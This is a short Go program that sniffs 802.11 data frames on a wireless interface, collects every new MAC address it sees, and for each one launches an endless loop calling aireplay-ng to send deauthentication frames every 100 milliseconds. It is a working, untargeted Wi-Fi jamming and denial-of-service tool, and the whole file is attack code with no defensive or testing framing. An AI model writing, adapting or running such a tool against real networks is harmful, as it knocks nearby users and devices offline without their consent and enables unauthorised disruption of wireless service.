package main

import (
	"log"
	"net"
	"os/exec"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// TODO: add a goroutine to switch between channels

func main() {

	interfaceName := "wlan0"

	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}

	defer handle.Close()

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	macAddressesChan := make(chan net.HardwareAddr)

	go func() {
		for packet := range packetSource.Packets() {
			ieee80211Layer := packet.Layer(layers.LayerTypeDot11)
			ieee80211LayerContents, _ := ieee80211Layer.(*layers.Dot11)
			if ieee80211LayerContents != nil {
				if ieee80211LayerContents.Type == layers.Dot11TypeData {
					macAddressesChan <- ieee80211LayerContents.Address2
				}
			}
		}
	}()

	go func() {
		uniqueMacAddresses := make([]net.HardwareAddr, 0)
		for macAddress := range macAddressesChan {
			for _, uniqueMacAddress := range uniqueMacAddresses {
				if macAddress.String() == uniqueMacAddress.String() {
					goto skip
				}
			}

			uniqueMacAddresses = append(uniqueMacAddresses, macAddress)
			log.Printf("[NEW]: New MAC address: %s\n", macAddress)

			go func() {
				for {
					cmd := exec.Command("aireplay-ng", "-0", "1", "-a", macAddress.String(), interfaceName)
					err := cmd.Run()
					if err != nil {
						log.Printf("[ERROR]: %s\n", err)
					}

					log.Printf("[DEAUTH]: Broadcast deauth BSSID: %s\n", macAddress)

					time.Sleep(100 * time.Millisecond)
				}
			}()

		skip:
		}
	}()

	select {}

}
